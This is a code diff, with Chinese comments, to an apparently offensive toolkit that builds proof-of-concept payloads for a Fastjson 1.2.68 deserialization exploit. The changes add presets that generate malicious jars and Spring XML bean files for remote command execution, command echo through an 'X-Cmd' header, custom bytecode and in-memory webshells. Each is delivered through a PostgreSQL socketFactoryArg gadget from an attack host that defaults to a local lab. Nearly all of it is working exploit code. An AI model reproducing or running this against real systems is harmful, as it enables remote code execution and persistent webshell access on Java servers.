@@ -8,16 +8,14 @@ from typing import Optional
 
 import httpx
 
+from fastjson_toolkit.poc.bytecode import BytecodePresetOptions, resolve_bytecode_payload
 from fastjson_toolkit.poc.echo import (
-    build_echo_artifact,
     build_spring_echo_xml,
     normalize_engine,
     supports_1268_echo,
 )
 from fastjson_toolkit.poc.getter import wrap_with_currency
 from fastjson_toolkit.poc.memshell import (
-    build_memshell_delivery,
-    generate_memshell,
     supports_1268_memshell,
     write_spring_memshell_attack_files,
 )
@@ -27,8 +25,10 @@ from fastjson_toolkit.poc.v1_2_68.models import (
     Poc1268GenerateResult,
     Poc1268SendOptions,
     Poc1268SendResult,
+    normalize_rce_preset,
 )
 from fastjson_toolkit.poc.v1_2_68.payloads import build_payload
+from fastjson_toolkit.poc.v1_2_80.attack_assets import build_bean_exec_xml
 from fastjson_toolkit.waf import apply_waf_payload
 
 COMMON_NOTES = [
@@ -38,7 +38,10 @@ COMMON_NOTES = [
     "payload 含重复 @type / StringCodec 畸形写法，勿再 json.dumps 规范化。",
     "getter：$ref 已内嵌；业务点另有期望类时可开 wrap_currency 套 Currency"
     "（MiscCodec，与版本无关）。",
-    "命令回显 / 内存马：仅 postgresql_ssrf（Spring ClassPathXml + 远程 jar）支持；二者互斥。",
+    "命令回显 / 内存马 / 自备字节码：仅 postgresql_ssrf；"
+    "preset=echo / memshell / custom。",
+    "预设：file=写证明文件；custom=自备 class；exec=ProcessBuilder（bean-exec.xml）；"
+    "echo=命令回显；memshell=内存马。",
 ]
 
 DEFAULT_ATTACK_BASE = "http://127.0.0.1:18080/attack"
@@ -73,8 +76,13 @@ def generate_poc_1268(
     entry = get_gadget(opts.gadget)
 
     socket_arg = opts.socket_factory_arg
-    memshell_on = bool(opts.memshell)
-    echo_on = bool(opts.echo) and not memshell_on
+    kind = normalize_rce_preset(
+        opts.preset, echo=bool(opts.echo), memshell=bool(opts.memshell)
+    )
+    memshell_on = kind == "memshell"
+    echo_on = kind == "echo"
+    custom_on = kind == "custom" and entry.id == "postgresql_ssrf"
+    exec_on = kind == "exec" and entry.id == "postgresql_ssrf"
     engine = ""
     cmd_header = ""
     jar_b64: Optional[str] = None
@@ -84,29 +92,37 @@ def generate_poc_1268(
     extra_notes: list[str] = []
 
     if memshell_on:
-        if opts.echo:
-            extra_notes.append("memshell 与 echo 互斥，已优先内存马模式")
+        if opts.echo or opts.preset == "echo":
+            extra_notes.append("preset=memshell 优先于 echo")
         if not supports_1268_memshell(entry.id):
             raise ValueError(
                 f"gadget={entry.id} 不支持内存马；仅 postgresql_ssrf 可嵌 Spring XML 内存马"
             )
         base = (opts.attack_base or DEFAULT_ATTACK_BASE).rstrip("/")
-        ms = generate_memshell(
-            backend=opts.ms_api,
-            server=opts.ms_server,
-            tool=opts.ms_tool,
-            shell_type=opts.ms_type,
-            url_pattern=opts.ms_path,
-            jdk=opts.ms_jdk,
-            static_initialize=False,
-        )
         jar_url = f"{base}/memshell.jar"
-        delivery = build_memshell_delivery(ms, jar_url=jar_url)
+        art = resolve_bytecode_payload(
+            BytecodePresetOptions(
+                preset="memshell",
+                ms_api=opts.ms_api,
+                ms_server=opts.ms_server,
+                ms_tool=opts.ms_tool,
+                ms_type=opts.ms_type,
+                ms_path=opts.ms_path,
+                ms_jdk=opts.ms_jdk,
+                ms_static_initialize=False,
+                ms_jar_url=jar_url,
+            )
+        )
+        if art is None:
+            raise RuntimeError("memshell resolve 失败")
+        delivery = (art.meta or {}).get("delivery")
+        if delivery is None:
+            raise RuntimeError("memshell delivery 缺失")
         jar_b64 = base64.b64encode(delivery.jar_bytes).decode("ascii")
         xml_b64 = base64.b64encode(delivery.spring_xml_bytes).decode("ascii")
         socket_arg = f"{base}/bean-memshell.xml"
-        memshell_info = ms.as_info_dict()
-        memshell_connect = ms.connect_info
+        memshell_info = art.memshell_info
+        memshell_connect = art.memshell_connect
         wrote = False
         for attack_dir in (_LAB_ATTACK, _FALLBACK_ATTACK):
             try:
@@ -121,48 +137,89 @@ def generate_poc_1268(
                 "无法写入 lab attack；请自行托管 memshell.jar + bean-memshell.xml"
                 "（见 attack_*_b64）"
             )
+        extra_notes.extend(art.notes)
         extra_notes.extend(delivery.notes)
-        extra_notes.append(
-            f"内存马：{ms.tool}/{ms.shell_type}/{ms.server}；"
-            f"socketFactoryArg → {socket_arg}"
-        )
-        extra_notes.append("连接信息：\n" + memshell_connect)
+        extra_notes.append(f"socketFactoryArg → {socket_arg}")
+        if memshell_connect:
+            extra_notes.append("连接信息：\n" + memshell_connect)
 
-    elif echo_on:
-        if not supports_1268_echo(entry.id):
+    elif echo_on or custom_on:
+        if echo_on and not supports_1268_echo(entry.id):
             raise ValueError(
                 f"gadget={entry.id} 不支持命令回显；仅 postgresql_ssrf 可嵌 Spring XML 回显"
             )
-        engine = normalize_engine(opts.engine)
-        cmd_header = (opts.cmd_header or "X-Cmd").strip() or "X-Cmd"
-        base = (opts.attack_base or DEFAULT_ATTACK_BASE).rstrip("/")
-        art = build_echo_artifact(
-            engine=engine,
-            cmd_header=cmd_header,
-            default_cmd=opts.cmd or "id",
-            class_name="EchoPayload",
-            banner="FJ1268-ECHO",
+        engine = normalize_engine(opts.engine) if echo_on else ""
+        cmd_header = (
+            ((opts.cmd_header or "X-Cmd").strip() or "X-Cmd") if echo_on else ""
         )
+        base = (opts.attack_base or DEFAULT_ATTACK_BASE).rstrip("/")
+        if custom_on:
+            art = resolve_bytecode_payload(
+                BytecodePresetOptions(
+                    preset="custom",
+                    class_b64=opts.class_b64,
+                    class_name="CustomPayload",
+                )
+            )
+            jar_name = "custom.jar"
+            xml_name = "bean-custom.xml"
+        else:
+            art = resolve_bytecode_payload(
+                BytecodePresetOptions(
+                    preset="echo",
+                    engine=engine,
+                    cmd_header=cmd_header,
+                    cmd=opts.cmd or "id",
+                    class_name="EchoPayload",
+                )
+            )
+            jar_name = "echo.jar"
+            xml_name = "bean-echo.xml"
+        if art is None:
+            raise RuntimeError("bytecode resolve 失败")
         jar_bytes = art.as_jar()
-        jar_url = f"{base}/echo.jar"
+        jar_url = f"{base}/{jar_name}"
         xml_bytes = build_spring_echo_xml(jar_url=jar_url, class_name=art.class_name)
         jar_b64 = base64.b64encode(jar_bytes).decode("ascii")
         xml_b64 = base64.b64encode(xml_bytes).decode("ascii")
-        socket_arg = f"{base}/bean-echo.xml"
+        socket_arg = f"{base}/{xml_name}"
         for attack_dir in (_LAB_ATTACK, _FALLBACK_ATTACK):
             try:
                 attack_dir.mkdir(parents=True, exist_ok=True)
-                (attack_dir / "echo.jar").write_bytes(jar_bytes)
-                (attack_dir / "bean-echo.xml").write_bytes(xml_bytes)
-                extra_notes.append(f"已写入 {attack_dir / 'echo.jar'} 与 bean-echo.xml")
+                (attack_dir / jar_name).write_bytes(jar_bytes)
+                (attack_dir / xml_name).write_bytes(xml_bytes)
+                extra_notes.append(f"已写入 {attack_dir / jar_name} 与 {xml_name}")
                 break
             except OSError:
                 continue
         else:
             extra_notes.append("无法写入 lab attack；请自行托管（见 attack_*_b64）")
+        extra_notes.extend(art.notes)
+        if echo_on:
+            extra_notes.append(
+                f"回显：engine={engine}，Header {cmd_header}={opts.cmd or 'id'}；"
+                f"socketFactoryArg → {socket_arg}"
+            )
+        else:
+            extra_notes.append(f"自备字节码 jar；socketFactoryArg → {socket_arg}")
+
+    elif exec_on:
+        base = (opts.attack_base or DEFAULT_ATTACK_BASE).rstrip("/")
+        xml_bytes = build_bean_exec_xml(opts.cmd or "id")
+        xml_b64 = base64.b64encode(xml_bytes).decode("ascii")
+        socket_arg = f"{base}/bean-exec.xml"
+        for attack_dir in (_LAB_ATTACK, _FALLBACK_ATTACK):
+            try:
+                attack_dir.mkdir(parents=True, exist_ok=True)
+                (attack_dir / "bean-exec.xml").write_bytes(xml_bytes)
+                extra_notes.append(f"已写入 {attack_dir / 'bean-exec.xml'}")
+                break
+            except OSError:
+                continue
+        else:
+            extra_notes.append("无法写入 lab attack；请托管 bean-exec.xml（见 attack_xml_b64）")
         extra_notes.append(
-            f"回显：engine={engine}，Header {cmd_header}={opts.cmd or 'id'}；"
-            f"socketFactoryArg → {socket_arg}"
+            f"Spring XML exec：cmd={opts.cmd or 'id'}；socketFactoryArg → {socket_arg}"
         )
 
     raw = build_payload(
